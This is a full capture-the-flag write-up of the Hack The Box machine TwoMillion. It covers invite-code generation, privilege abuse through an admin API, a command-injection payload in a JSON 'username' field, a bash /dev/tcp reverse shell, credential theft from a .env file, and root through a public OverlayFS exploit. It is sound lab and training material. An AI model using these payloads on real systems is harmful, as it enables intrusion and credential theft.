# [TwoMillion](https://app.hackthebox.com/machines/TwoMillion) Writeup [HTB]
## ⏯️ Credits
Thanks to IppSec for the [great walkthrough](https://www.youtube.com/watch?v=Exl4P3fsF7U), as always. Very insightful whenever I get stuck!

## 🧭 Reaching the website
As per usual, we begin by scanning the services that are exposed using `nmap`. The only services are ports 22 (ssh) and 80 (http). We also discover that the host name is `2million.htb`. Interestingly, the browser is having trouble redirecting the page, so we add `2million.htb` to the list of known hosts.
```sh
$ vim /etc/hosts
# add this line
10.10.11.221    2million.htb
```
Now everything works fine: the website appears to be an old version of Hack The Box. We also re-run `nmap`, since some scripts are executed only if the hostname is known. However, we don't find anything interesting.

## 💃 Getting the invite code
First, we want to create an account for the website, so that we can log in. To do so, it looks like we need an invite code (which we don't have). While investigating the content of the page, we find a suspicious file, `inviteapi.min.js`. The content of the file is some obfuscated, hell-sent javascript code, so we copy-paste it into ChatGPT to decrypt it for us:
```js
[...]
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```
It looks like we can send an HTTP POST request to `/api/v1/invite/how/to/generate` to get a hint on what to do next. We get back some scrambled letters, together with an encryption method: ROT13. 

ROT13 is a special case of Cesar's smash-hit cipher, where the letters are shifted by 13 places. We decrypt the message and obtain the hint: _In order to generate the invite code, make a POST request to `/api/v1/invite/generate`_.

This second POST finally returns an encoded, base64-smelling string. We decode it and get the invite!
```sh
$ echo NjVYNFgtMjkyWjEtS0VGVkYtTkg0SlY= | base64 -d
65X4X-292Z1-KEFVF-NH4JV
```
Now we can create an account and log on the website.

## 🛡️ Becoming an admin
After logging in, the website functionalities become pretty limited and, luckily for us, many pages are not actually there. Since we are aiming for a reverse shell, we start investigating the APIs. An HTTP GET request to `/api/v1` conveniently returns a complete list:
```json
"user": {
	"GET": {
	"/api/v1": "Route List",
	"/api/v1/invite/how/to/generate": "Instructions on invite code generation",
	"/api/v1/invite/generate": "Generate invite code",
	"/api/v1/invite/verify": "Verify invite code",
	"/api/v1/user/auth": "Check if user is authenticated",
	"/api/v1/user/vpn/generate": "Generate a new VPN configuration",
	"/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
	"/api/v1/user/vpn/download": "Download OVPN file"
	},
	"POST": {
	"/api/v1/user/register": "Register a new user",
	"/api/v1/user/login": "Login with existing user"
	}
},
"admin": {
	"GET": {
	"/api/v1/admin/auth": "Check if user is admin"
	},
	"POST": {
	"/api/v1/admin/vpn/generate": "Generate VPN for specific user"
	},
	"PUT": {
	"/api/v1/admin/settings/update": "Update user settings"
	}
}
```
We begin with checking whether we are an admin. Of course, we aren't. Since we want to become one, we kindly ask the server by sending a PUT request to `/api/v1/admin/settings/update`. Our kindness is more that enough, since every user is allowed to send this request! 
We don't really know what are the expected fields, but the server nicely returns explicit error messages, so we are able to provide the correct json with few attempts.
```json
{
	"loggedin":true,
	"username":"real-admin",
	"email":"real.fr@admin.fr",
	"is_admin":1
}
```
`real-admin` is now an actual admin!

## 🐚 Getting the reverse shell
Up to now, there was only one API we weren't allowed to call: `/api/v1/admin/vpn/generate`. Clearly, we use our new admin powers to see what it does.
As before, few attempts are enough to discover the single field, which is `"username"`. 
We try a simple POC command injection to check whether the server is vulnerable:
```json
{
	"username":"real-admin;sleep 2"
}
```
It is!

We open our classic channel:
```sh
$ nc -lvnkp 4815
```
and then get the reverse shell:
```json
{
	"username":"real-admin;bash -c 'bash -i >& /dev/tcp/10.10.14.136/4815 0>&1'"
}
```

## ⚔️ Becoming an admin, again
As soon as obtaining the shell, we check which user we are in control of:
```
$ whoami
www-data
```
Since the first flag is in the `/home/admin/` folder, we need to become an admin. Again.

`www-data` has limited privileges, but can read all the web application files. Therefore, we take a look to `.env`, hoping to find some credentials there:
```
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
Bingo! We are ready to escalate our privileges and read the flag:
```
$ su - admin
Password: SuperDuperPass123
$ whoami
admin
$ ls
user.txt
$ cat user.txt
<ADMIN FLAG>
```

## 🫛 Becoming ~~a pea superfan~~ root
To own the last flag, we need to escalate privilege again, and become the root. However, this looks like an impossible task (to me, an HTB noob).

At this moment of desperation, we use `linpeas` to scan for possible privilege escalation paths.

<!-- TODO -->

Results suggest mind admin's business, and looking into their mailbox:
```sh
$ cat /var/spool/mail/admin
[...]
Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
A simple search on Google reveals the mail is likely referring to CVE-2023-0386. We then find [this POC](https://github.com/sxlmnwb/CVE-2023-0386). Time to become root!

As for `linpeas`, we need to send the POC code to the web server. Therefore, we download it on our machine, compress it and expose it using python3's web server.
```sh
$ git clone https://github.com/sxlmnwb/CVE-2023-0386
$ rm -fr CVE-2023-0386/.git
$ tar -czvf CVE-2023-0386.tar.gz CVE-2023-0386/
$ python3 -m http.server 8000
```
In our admin shell, we download the tar folder, extract it, and follow the README instructions to run the exploit.

<!-- TODO -->
The only thing left to do is reading the flag!
```sh
$ whoami
root
$ cat /root/root.txt
<ROOT FLAG>
```

## 🫖 Conclusion and tools recap
What a humbling experience! If this box was easy, I don't want to think about the insane ones...

Anyway, now I'm slightly crazier than before. Also, I hate curl. And I need to sleep.

A great experience! 418/10 would recommend.  

**__Tools recap__**
<!--TODO-->